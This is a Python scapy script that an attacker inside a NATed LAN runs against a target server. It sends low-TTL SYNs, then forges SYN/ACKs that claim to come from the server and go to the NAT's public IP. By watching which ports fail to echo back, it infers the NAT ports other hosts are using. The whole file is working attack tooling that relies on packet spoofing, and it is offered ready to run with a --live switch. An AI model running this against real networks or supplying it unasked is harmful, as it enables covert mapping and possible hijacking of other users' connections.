#!/usr/bin/env python3

import time
import random
import threading
import queue
from pathlib import Path
from typing import Set, Iterable
from scapy.all import IP, TCP, send, AsyncSniffer, get_if_addr

# ---------- CONFIG ----------
IFACE = "wlo1"              
START_PORT = 32768
END_PORT = 65535            
BATCH_SIZE = 1000          
SEND_DELAY = 0.00005        
POST_WAIT = 0.25          
PKT_QSIZE = 20000
TTL_SYN = 2
TTL_SYNACK = 3
SEQ_C = 1000
SEQ_S = 2000
attacker_ip = "192.168.0.10" # Attacker's private IP in the NATed LAN
server_ip = " "  # the target server IP eg. 4.4.4.4
SERVER_PORT = 22
nat_ip = " "     # The NAT's public IP eg. 6.6.6.6
# ----------------------------

pkt_q = queue.Queue(maxsize=PKT_QSIZE)
stop_evt = threading.Event()

def build_ports(start: int, end_inc: int):
    for p in range(start, end_inc + 1):
        yield p

def producer_sniffer(iface: str, server_ip: str, server_port: int):
    # BPF: TCP from server:server_port with SYN+ACK set (tcp[13] & 0x12 == 0x12)
    bpf = f"tcp and src host {server_ip} and src port {server_port} and (tcp[13] & 0x12) == 0x12"
    def _prod(pkt):
        try:
            pkt_q.put_nowait(pkt.copy())
        except queue.Full:
            pass
    sn = AsyncSniffer(iface=iface, filter=bpf, store=False, prn=_prod)
    sn.start()
    time.sleep(0.05) 
    return sn

def consumer(recv_set: Set[int], recv_lock: threading.Lock, attacker_ip: str, stop_event: threading.Event):
    """
    Consumer loop: pull packets off queue and add dport to recv_set
    only when pkt IP src==server_ip and dst==attacker_ip and flags SYN+ACK.
    """
    from scapy.all import IP as _IP, TCP as _TCP
    while not stop_event.is_set() or not pkt_q.empty():
        try:
            pkt = pkt_q.get(timeout=0.5)
        except queue.Empty:
            continue
        if _IP in pkt and _TCP in pkt:
            ip = pkt[_IP]
            tcp = pkt[_TCP]
            if (int(tcp.flags) & 0x12) == 0x12 and ip.dst == attacker_ip:
                dport = int(tcp.dport)
                with recv_lock:
                    recv_set.add(dport)
        pkt_q.task_done()

def send_syns(attacker_ip: str, server_ip: str, server_port: int, ports: Iterable[int], iface: str, delay: float):
    """ SYNs from attacker_ip -> server_ip:dport=server_port with varying source ports."""
    for sport in ports:
        pkt = IP(src=attacker_ip, dst=server_ip, ttl=TTL_SYN) / TCP(sport=sport, dport=server_port, flags="S",seq =SEQ_C)
        send(pkt, iface=iface, verbose=False)
        time.sleep(delay)

def send_synacks(server_ip: str, nat_ip: str, server_port: int, ports: Iterable[int], iface: str, delay: float):
    """Crafted SYN/ACKs with src=server_ip dst=nat_ip, dport=port."""
    for dport in ports:
        pkt = IP(src=server_ip, dst=nat_ip, ttl=TTL_SYNACK) / TCP(sport=server_port, dport=dport, flags="SA", seq=SEQ_S, ack=SEQ_C+1)
        send(pkt, iface=iface, verbose=False)
        time.sleep(delay)

def batch_iter(start, end_inc, batch):
    cur = start
    while cur <= end_inc:
        hi = min(cur + batch - 1, end_inc)
        yield cur, hi
        cur = hi + 1

def compress_ranges(lst):
    if not lst:
        return ""
    lst = sorted(lst)
    ranges = []
    s = prev = lst[0]
    for x in lst[1:]:
        if x == prev + 1:
            prev = x
            continue
        if s == prev:
            ranges.append(str(s))
        else:
            ranges.append(f"{s}-{prev}")
        s = prev = x
    if s == prev:
        ranges.append(str(s))
    else:
        ranges.append(f"{s}-{prev}")
    return ",".join(ranges)

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", help="interface to use", default=IFACE)
    ap.add_argument("--start_port", type=int, default=START_PORT)
    ap.add_argument("--end_port", type=int, default=END_PORT)
    ap.add_argument("--batch_size", type=int, default=BATCH_SIZE)
    ap.add_argument("--delay", type=float, default=SEND_DELAY)
    ap.add_argument("--post-wait", type=float, default=POST_WAIT)
    ap.add_argument("--server-port", type=int, default=SERVER_PORT)
    ap.add_argument("--live", action="store_true", help="send packets/if not set, cold run")
    args = ap.parse_args()

    IFACE = args.iface
    START_PORT = args.start_port
    END_PORT = args.end_port
    BATCH_SIZE = args.batch_size
    SEND_DELAY = args.delay
    POST_WAIT = args.post_wait
    SERVER_PORT = args.server_port
    LIVE = args.live

   # print("\nEnter Input\n:")
   # attacker_ip = input(" Attacker IP : ").strip()
   # server_ip   = input(" Server IP : ").strip()
   # nat_ip      = input(" NAT device public IP: ").strip()
    
    print(f"\nUsing iface {IFACE} ports {START_PORT}-{END_PORT} batch {BATCH_SIZE}.\n")


    if not attacker_ip:
        try:
            attacker_ip = get_if_addr(IFACE)
            print(f"[+] auto attacker IP: {attacker_ip}")
        except Exception:
            print("[!] couldn't auto-resolve attacker IP; please provide it explicitly in config at top and restart.")
            exit(1)

    # shared recv set and lock
    recv = set()
    rlock = threading.Lock()

    # start producer sniffer
    sniffer = producer_sniffer(IFACE, server_ip, SERVER_PORT)
    # start consumer thread
    consumer_stop = threading.Event()
    cons = threading.Thread(target=consumer, args=(recv, rlock, attacker_ip, consumer_stop), daemon=True)
    cons.start()

    try:
        for lo, hi in batch_iter(START_PORT, END_PORT, BATCH_SIZE):
            print(f"\n=== BATCH {lo}-{hi} ===")
            ports = list(range(lo, hi+1))

            with rlock:
                recv.clear()

            print(f"[+] Sending SYNs attacker->{server_ip}:{SERVER_PORT} for ports {lo}-{hi} (live={LIVE})")
            if LIVE:
                send_syns(attacker_ip, server_ip, SERVER_PORT, ports, IFACE, SEND_DELAY)
            else:
                print(" [Dry RUN] use --live to send)")
                
            time.sleep(POST_WAIT)

            with rlock:
                seen_after_syn = set(recv)
                recv.clear()

            matched_after_syn = set(ports).intersection(seen_after_syn)
            left = set(ports) - matched_after_syn
            print(f"  replies seen immediately after SYN stage: {len(matched_after_syn)}; remaining to probe: {len(left)}")

            if not left:
                print("  all ports replied after SYN stage; moving to next batch")
                continue

            print(f"[+] Sending crafted SYN/ACKs src={server_ip} -> dst={nat_ip} for {len(left)} ports (live={LIVE})")
            if LIVE:
                send_synacks(server_ip, nat_ip, SERVER_PORT, sorted(left), IFACE, SEND_DELAY)
            else:
                print(" [Dry RUN] (use --live to send)")

            time.sleep(POST_WAIT)

            with rlock:
                seen_after_synack = set(recv)
                recv.clear()

            matched_after_synack = left.intersection(seen_after_synack)
            remaining = left - matched_after_synack

            print(f"  after SYN/ACK stage: seen_back={len(matched_after_synack)}  remaining(possibly forwarded)={len(remaining)}")

            if remaining:
                print("  [port in use], did NOT appear back to attacker:")
                print("   ", compress_ranges(sorted(list(remaining))))
            else:
                print("  no [no port in use] detected in this batch")

        print("\nDone scanning all batch.")
    finally:
        consumer_stop.set()
        cons.join(timeout=2)
        try:
            sniffer.stop()
        except Exception:
            pass
        print("Stopped sniffer & consumer.")

